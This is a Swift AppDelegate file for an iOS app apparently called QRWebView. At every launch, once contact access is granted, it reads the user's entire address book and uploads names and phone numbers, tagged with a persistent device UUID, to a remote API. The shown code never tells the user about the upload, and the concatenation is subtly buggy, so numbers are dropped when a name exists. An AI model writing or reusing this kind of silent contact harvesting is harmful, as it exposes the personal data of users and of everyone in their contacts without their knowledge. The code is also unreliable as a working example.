//
//  AppDelegate.swift
//  QRWebView
//
//  Created by Asad Khan on 12/13/17.
//  Copyright © 2017 Asad Khan. All rights reserved.
//

import UIKit
import AddressBook
import Contacts

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    
    public var uniqueIdentifier : String? {
        
        get {
            //code to execute
            return UserDefaults.standard.string(forKey: Constants.User.Keys.uniqueID)
        }
        set(uniqueID) {
            UserDefaults.standard.setValue(uniqueID, forKey: Constants.User.Keys.uniqueID)
        }
    }
    
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
        
        // Generate UUID just one time only
        if uniqueIdentifier == nil{
            uniqueIdentifier = NSUUID().uuidString
        }
        
        
        Contact.init().getAllContacts { (result) in
            
            var contactJson = [String]()
            switch result{
                
            case .Granted(let contactList):
                
                for contact in contactList{
                    
                    let name = CNContactFormatter.string(from: contact, style: .fullName)
    
                    if let number = contact.phoneNumbers.first?.value.stringValue{
                        
                        contactJson.append(name ?? "" + "|" + number)
                    }else{
                        contactJson.append(name ?? "" + "|" + "")
                    }
                    
                }
                if contactJson.count > 0{
                    APICaller.init().upload(contacts: contactJson, uuid:self.uniqueIdentifier! )
                }
            case .Other(let str):
                print(str)
                
                
            }
        }
        return true
    }

    func applicationWillResignActive(_ application: UIApplication) {
        // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
        // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
        // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
        // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
    }

    func applicationWillTerminate(_ application: UIApplication) {
        // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
    }


}

